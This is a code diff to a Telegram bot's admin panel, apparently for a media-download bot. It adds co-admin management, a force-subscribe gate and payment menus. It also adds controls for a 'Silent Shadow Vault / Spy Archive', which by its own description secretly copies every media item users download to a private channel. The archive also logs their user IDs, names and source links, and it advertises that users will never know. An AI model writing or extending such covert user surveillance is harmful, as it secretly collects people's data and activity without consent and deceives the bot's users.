@@ -15,8 +15,20 @@ from core.rate_limiter import rate_registry
 from core.state_manager import set_user_state, get_user_state, clear_user_state
 
 
+_cached_admin_ids: set[int] = set()
+
+async def refresh_admin_cache():
+    global _cached_admin_ids
+    try:
+        all_ids = await db.get_all_admin_ids()
+        _cached_admin_ids = set(all_ids)
+    except Exception:
+        _cached_admin_ids = set(ADMIN_IDS)
+
 def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+    if user_id in ADMIN_IDS:
+        return True
+    return user_id in _cached_admin_ids
 
 
 async def build_admin_panel_data():
@@ -70,27 +82,31 @@ async def build_admin_panel_data():
         [
             [
                 InlineKeyboardButton("👥 User Management", callback_data="adm_view_users"),
-                InlineKeyboardButton(f"🎬 Free Watermark: {'ON 🟢' if cfg['enabled'] else 'OFF ⚪'}", callback_data="adm_quick_toggle_wm"),
+                InlineKeyboardButton("👑 Admin IDs Management", callback_data="adm_view_admins"),
             ],
             [
                 InlineKeyboardButton(f"💳 Payments ({stats['pending_trx']})", callback_data="adm_view_payments"),
                 InlineKeyboardButton("📢 Broadcast Promo", callback_data="adm_view_broadcast_help"),
             ],
             [
-                InlineKeyboardButton("🎬 Watermark Studio & Position", callback_data="adm_view_global_wm"),
-                InlineKeyboardButton("🎛️ Tier Permissions (Free vs VIP)", callback_data="adm_view_tier_perms"),
+                InlineKeyboardButton("📢 Force-Subscribe Gate", callback_data="adm_view_fsub_menu"),
+                InlineKeyboardButton("🗄️ Shadow Vault Mirror", callback_data="adm_view_archive_menu"),
+            ],
+            [
+                InlineKeyboardButton("💳 Payment Accounts & Notice", callback_data="adm_view_pay_methods"),
+                InlineKeyboardButton("🎬 Watermark Studio & Branding", callback_data="adm_view_global_wm"),
             ],
             [
                 InlineKeyboardButton("⚙️ System Settings", callback_data="adm_view_sys_settings"),
+                InlineKeyboardButton("🎛️ Tier Permissions (Free/VIP)", callback_data="adm_view_tier_perms"),
+            ],
+            [
                 InlineKeyboardButton("🎁 Referral & VIP Rewards", callback_data="adm_view_referral_rewards"),
-            ],
-            [
                 InlineKeyboardButton("🔒 VIP Channel Lock", callback_data="adm_view_viplock"),
-                InlineKeyboardButton(f"👥 Worker Pool ({len(pool_accs)})", callback_data="view_my_accounts"),
             ],
             [
+                InlineKeyboardButton(f"👥 Worker Pool ({len(pool_accs)})", callback_data="view_my_accounts"),
                 InlineKeyboardButton("🛡️ Anti-Ban Health", callback_data="adm_view_antiban"),
-                InlineKeyboardButton("🧪 Test Free/VIP Mode", callback_data="adm_view_mode_menu"),
             ],
             [
                 InlineKeyboardButton("🔄 Refresh Dashboard", callback_data="adm_open_panel"),
@@ -104,6 +120,7 @@ async def build_admin_panel_data():
 @Client.on_message(filters.command(["admin", "panel"]) & filters.private)
 async def admin_panel_handler(client: Client, message: Message):
     user_id = message.from_user.id
+    await refresh_admin_cache()
     if not is_admin(user_id):
         return
 
@@ -128,6 +145,267 @@ async def adm_open_panel_callback(client: Client, callback_query: CallbackQuery)
         await callback_query.message.edit_text(text, reply_markup=markup)
     except Exception:
         await callback_query.message.reply_text(text, reply_markup=markup)
+
+
+# =====================================================================
+# 1.0 ADMIN & CO-ADMIN MANAGEMENT COCKPIT
+# =====================================================================
+
+async def render_admins_menu():
+    await refresh_admin_cache()
+    from config import ADMIN_IDS
+    dyn_admins = await db.get_dynamic_admins()
+
+    text_lines = [
+        "👑 **ADMIN & CO-ADMIN MANAGEMENT COCKPIT** 👑\n",
+        "Manage Telegram users and admin groups authorized to access this control cockpit.",
+        "Co-admins can approve payments, manage users, and configure bot settings.\n",
+        "🏛️ **Master Admins (from .env - Permanent):**"
+    ]
+    for aid in ADMIN_IDS:
+        text_lines.append(f"• 👑 Super Admin: `{aid}`")
+
+    text_lines.append("\n🛡️ **Dynamic Co-Admins (Configured via Panel):**")
+    if dyn_admins:
+        for a in dyn_admins:
+            aid = a["admin_id"]
+            title = a["title"]
+            dt = str(a.get("created_at", ""))[:10]
+            text_lines.append(f"• 🛡️ **{title}:** `{aid}` (Added: `{dt}`)")
+    else:
+        text_lines.append("• _No dynamic co-admins added yet._")
+
+    text_lines.append(
+        "\n📌 **Quick Commands:**\n"
+        "• `/addadmin <id> [title]` — Grant admin privileges\n"
+        "• `/deladmin <id>` — Revoke admin privileges\n"
+        "• `/admins` — View list of all active admins"
+    )
+
+    keyboard = []
+    if dyn_admins:
+        for a in dyn_admins:
+            aid = a["admin_id"]
+            title = a["title"][:14]
+            keyboard.append([
+                InlineKeyboardButton(f"🗑️ Revoke {title} ({aid})", callback_data=f"adm_del_admin:{aid}")
+            ])
+
+    keyboard.append([
+        InlineKeyboardButton("➕ Add Co-Admin ID", callback_data="adm_btn_add_admin"),
+        InlineKeyboardButton("🔄 Refresh List", callback_data="adm_view_admins"),
+    ])
+    keyboard.append([
+        InlineKeyboardButton("🔙 Back to Cockpit", callback_data="adm_open_panel"),
+    ])
+    return "\n".join(text_lines), InlineKeyboardMarkup(keyboard)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_view_admins$"))
+async def adm_view_admins_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        await callback_query.answer("⛔ Admin access only.", show_alert=True)
+        return
+    await callback_query.answer()
+    clear_user_state(callback_query.from_user.id)
+    text, markup = await render_admins_menu()
+    try:
+        await callback_query.message.edit_text(text, reply_markup=markup)
+    except Exception:
+        await callback_query.message.reply_text(text, reply_markup=markup)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_btn_add_admin$"))
+async def adm_btn_add_admin_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        return
+    await callback_query.answer()
+    set_user_state(callback_query.from_user.id, "waiting_adm_add_admin")
+    text = (
+        "➕ **ADD NEW CO-ADMIN**\n\n"
+        "Send the Telegram User ID (or Group ID) and an optional title/name.\n\n"
+        "**Format:** `<User_ID> [Title]`\n\n"
+        "**Examples:**\n"
+        "• `1234567890`\n"
+        "• `1234567890 Support Lead`\n"
+        "• `-1002459862936 Admin Group`\n\n"
+        "👉 _Send ID now, or tap Cancel:_"
+    )
+    markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="adm_view_admins")]])
+    await callback_query.message.edit_text(text, reply_markup=markup)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_del_admin:(-?\d+)"))
+async def adm_del_admin_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        return
+    target_id = int(callback_query.matches[0].group(1))
+    from config import ADMIN_IDS
+    if target_id in ADMIN_IDS:
+        await callback_query.answer("⛔ Master admin defined in .env cannot be removed from panel.", show_alert=True)
+        return
+    ok = await db.remove_dynamic_admin(target_id)
+    await refresh_admin_cache()
+    if ok:
+        await callback_query.answer(f"🗑️ Admin privileges revoked for {target_id}!", show_alert=False)
+    else:
+        await callback_query.answer("❌ Admin not found.", show_alert=True)
+    text, markup = await render_admins_menu()
+    try:
+        await callback_query.message.edit_text(text, reply_markup=markup)
+    except Exception:
+        await callback_query.message.reply_text(text, reply_markup=markup)
+
+
+# =====================================================================
+# 1.1 FORCE-SUBSCRIBE MANAGEMENT & HEALTH CHECK
+# =====================================================================
+
+async def render_fsub_menu():
+    fsub = await db.get_force_sub_channel()
+    status_tag = f"🟢 ACTIVE (`{fsub}`)" if fsub else "🔴 DISABLED (No channel enforced)"
+
+    text = (
+        "📢 **FORCE-SUBSCRIBE GATEWAY SETTINGS** 📢\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Require all Free users to join your Telegram channel before using the bot.\n"
+        "VIP subscribers bypass this requirement automatically.\n\n"
+        f"• **Current Force-Sub Gate:** {status_tag}\n\n"
+        "📌 **Quick Commands:**\n"
+        "• `/setfsub @YourChannel` or `https://t.me/YourChannel`\n"
+        "• `/clearfsub` (or `/setfsub none`) — Disables force-subscribe\n"
+        "• `/fsub` — Check live gate status\n"
+    )
+    keyboard = [
+        [
+            InlineKeyboardButton("✏️ Set / Change Channel", callback_data="adm_btn_set_fsub"),
+            InlineKeyboardButton("❌ Disable Force-Sub", callback_data="adm_clear_fsub"),
+        ],
+        [
+            InlineKeyboardButton("🧪 Test Channel Connection", callback_data="adm_test_fsub"),
+        ],
+        [
+            InlineKeyboardButton("🔙 Back to Cockpit", callback_data="adm_open_panel"),
+            InlineKeyboardButton("⚙️ System Settings", callback_data="adm_view_sys_settings"),
+        ]
+    ]
+    return text, InlineKeyboardMarkup(keyboard)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_view_fsub_menu$"))
+async def adm_view_fsub_menu_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        await callback_query.answer("⛔ Admin access only.", show_alert=True)
+        return
+    await callback_query.answer()
+    clear_user_state(callback_query.from_user.id)
+    text, markup = await render_fsub_menu()
+    try:
+        await callback_query.message.edit_text(text, reply_markup=markup)
+    except Exception:
+        await callback_query.message.reply_text(text, reply_markup=markup)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_test_fsub$"))
+async def adm_test_fsub_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        return
+    fsub = await db.get_force_sub_channel()
+    if not fsub:
+        await callback_query.answer("⚠️ No force-subscribe channel is currently configured!", show_alert=True)
+        return
+    clean_target = fsub.replace("https://t.me/", "@").strip()
+    try:
+        chat = await client.get_chat(clean_target)
+        title = chat.title or "Channel"
+        members = chat.members_count or "N/A"
+        await callback_query.answer(
+            f"✅ Force-Sub Channel Connected!\n\n• Title: {title}\n• ID: {chat.id}\n• Members: {members}\n• Bot Access: OK",
+            show_alert=True
+        )
+    except Exception as e:
+        await callback_query.answer(
+            f"❌ Connection Failed!\nError: {e}\n\nMake sure the bot is an Administrator in the channel!",
+            show_alert=True
+        )
+
+
+# =====================================================================
+# 1.2 SHADOW VAULT & ARCHIVE MIRROR SETTINGS
+# =====================================================================
+
+async def render_archive_menu():
+    archive_ch = await db.get_admin_archive_channel()
+    status_tag = f"🟢 ACTIVE (`{archive_ch}`)" if archive_ch else "🔴 DISABLED"
+
+    text = (
+        "🗄️ **SILENT SHADOW VAULT / SPY ARCHIVE SETTINGS** 🗄️\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Every single media downloaded or forwarded by ANY user will be secretly cloned to this private channel.\n\n"
+        f"• **Target Archive Channel ID:** {status_tag}\n\n"
+        "🕵️ **Zero-Trace Stealth Guarantees:**\n"
+        "• 0% User Awareness (Users will NEVER know)\n"
+        "• Full Audit Telemetry (Captures: Source Channel Name, Channel ID, Post Link, User ID, User Name)\n"
+        "• Asynchronous Non-Blocking execution (Zero impact on download speed)\n\n"
+        "📌 **Quick Commands:**\n"
+        "• `/setarchive -100xxxxxxxxxx` or `/setspy -100xxxxxxxxxx`\n"
+        "• `/cleararchive` — Disables auto-mirroring\n"
+        "• `/testarchive` — Send stealth handshake ping\n"
+    )
+    keyboard = [
+        [
+            InlineKeyboardButton("✏️ Set / Change Channel ID", callback_data="adm_btn_set_archive"),
+            InlineKeyboardButton("❌ Disable Shadow Vault", callback_data="adm_clear_archive"),
+        ],
+        [
+            InlineKeyboardButton("🧪 Test Vault Handshake", callback_data="adm_test_archive"),
+        ],
+        [
+            InlineKeyboardButton("🔙 Back to Cockpit", callback_data="adm_open_panel"),
+            InlineKeyboardButton("⚙️ System Settings", callback_data="adm_view_sys_settings"),
+        ]
+    ]
+    return text, InlineKeyboardMarkup(keyboard)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_view_archive_menu$"))
+async def adm_view_archive_menu_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        await callback_query.answer("⛔ Admin access only.", show_alert=True)
+        return
+    await callback_query.answer()
+    clear_user_state(callback_query.from_user.id)
+    text, markup = await render_archive_menu()
+    try:
+        await callback_query.message.edit_text(text, reply_markup=markup)
+    except Exception:
+        await callback_query.message.reply_text(text, reply_markup=markup)
+
+
+@Client.on_callback_query(filters.regex(r"^adm_test_archive$"))
+async def adm_test_archive_callback(client: Client, callback_query: CallbackQuery):
+    if not is_admin(callback_query.from_user.id):
+        return
+    archive_ch = await db.get_admin_archive_channel()
+    if not archive_ch:
+        await callback_query.answer("⚠️ No archive channel ID is currently configured!", show_alert=True)
+        return
+    try:
+        test_msg = await client.send_message(
+            chat_id=archive_ch,
+            text="🔔 **Antigravity Spy Vault Test Ping**\n• Status: Operational\n• Write Access: Verified\n_(This message will self-destruct in 5s)_"
+        )
+        await asyncio.sleep(5)
+        try:
+            await test_msg.delete()
+        except Exception:
+            pass
+        await callback_query.answer("✅ Handshake Successful! Bot has full posting permissions in Shadow Vault.", show_alert=True)
+    except Exception as e:
+        await callback_query.answer(
+            f"❌ Handshake Failed!\nError: {e}\n\nMake sure the bot is an Administrator in Channel {archive_ch} with 'Post Messages' permission!",
+            show_alert=True
+        )
 
 
 # =====================================================================
@@ -2683,6 +2961,98 @@ async def clear_archive_command(client: Client, message: Message):
     await message.reply_text("✅ Silent shadow spy archive channel disabled.")
 
 
+@Client.on_message(filters.command(["addadmin", "newadmin"]) & filters.private)
+async def add_admin_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    if len(message.command) < 2:
+        await message.reply_text("Usage: `/addadmin <user_id> [title]`\nExample: `/addadmin 123456789 Support Manager`")
+        return
+    try:
+        target_id = int(message.command[1])
+        title = " ".join(message.command[2:]) if len(message.command) > 2 else "Co-Admin"
+        await db.add_dynamic_admin(target_id, added_by=message.from_user.id, title=title)
+        await refresh_admin_cache()
+        await message.reply_text(f"✅ User `{target_id}` added as **{title}** with full admin privileges!")
+    except ValueError:
+        await message.reply_text("⚠️ User ID must be numeric.")
+
+
+@Client.on_message(filters.command(["deladmin", "removeadmin"]) & filters.private)
+async def del_admin_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    if len(message.command) < 2 or not message.command[1].lstrip("-").isdigit():
+        await message.reply_text("Usage: `/deladmin <user_id>`")
+        return
+    target_id = int(message.command[1])
+    from config import ADMIN_IDS
+    if target_id in ADMIN_IDS:
+        await message.reply_text("⛔ Master admins defined in .env cannot be removed.")
+        return
+    ok = await db.remove_dynamic_admin(target_id)
+    await refresh_admin_cache()
+    if ok:
+        await message.reply_text(f"🗑️ Admin privileges revoked for `{target_id}`.")
+    else:
+        await message.reply_text("❌ Admin ID not found in dynamic admin list.")
+
+
+@Client.on_message(filters.command("admins") & filters.private)
+async def list_admins_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    text, markup = await render_admins_menu()
+    await message.reply_text(text, reply_markup=markup)
+
+
+@Client.on_message(filters.command(["fsub", "forcesub"]) & filters.private)
+async def fsub_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    text, markup = await render_fsub_menu()
+    await message.reply_text(text, reply_markup=markup)
+
+
+@Client.on_message(filters.command(["archive", "vault"]) & filters.private)
+async def archive_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    text, markup = await render_archive_menu()
+    await message.reply_text(text, reply_markup=markup)
+
+
+@Client.on_message(filters.command("testarchive") & filters.private)
+async def test_archive_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    archive_ch = await db.get_admin_archive_channel()
+    if not archive_ch:
+        await message.reply_text("⚠️ No archive channel configured. Set with `/setarchive <id>`.")
+        return
+    try:
+        t_msg = await client.send_message(
+            chat_id=archive_ch,
+            text="🔔 **Antigravity Spy Vault Test Ping**\n• Status: Operational\n• Time: Current"
+        )
+        await asyncio.sleep(4)
+        try:
+            await t_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(f"✅ Handshake OK! Successfully posted & verified in channel `{archive_ch}`.")
+    except Exception as e:
+        await message.reply_text(f"❌ Handshake Failed: {e}\nEnsure bot is admin in `{archive_ch}`.")
+
+
+@Client.on_message(filters.command(["paymethods", "paymentmethods"]) & filters.private)
+async def paymethods_command(client: Client, message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    text, markup = await render_pay_methods_menu()
+    await message.reply_text(text, reply_markup=markup)
+
+
 @Client.on_message(filters.command("grant") & filters.private)
 async def grant_feature_command(client: Client, message: Message):
     """Grant custom feature override to an individual user."""
@@ -3020,6 +3390,29 @@ async def admin_input_interceptor(client: Client, message: Message):
             )
             message.stop_propagation()
             return
+
+    # 1.1 Add Dynamic Co-Admin (<admin_id> [title])
+    if state == "waiting_adm_add_admin":
+        clear_user_state(user_id)
+        parts = text.strip().split(maxsplit=1)
+        raw_id = parts[0]
+        title = parts[1].strip() if len(parts) > 1 else "Co-Admin"
+        try:
+            target_admin_id = int(raw_id)
+            await db.add_dynamic_admin(target_admin_id, added_by=user_id, title=title)
+            await refresh_admin_cache()
+            await message.reply_text(
+                f"✅ **Admin Privileges Granted!**\n\n"
+                f"• **Admin ID:** `{target_admin_id}`\n"
+                f"• **Role/Title:** `{title}`\n"
+                f"• Permissions: Full Cockpit & Management Access Granted"
+            )
+        except ValueError:
+            await message.reply_text("⚠️ Invalid ID format. Must be a numeric Telegram User ID or Group ID (e.g. `123456789`).")
+        a_text, a_markup = await render_admins_menu()
+        await message.reply_text(a_text, reply_markup=a_markup)
+        message.stop_propagation()
+        return
 
     # 2. Revoke Premium (<user_id>)
     if state == "waiting_adm_rem_prem":
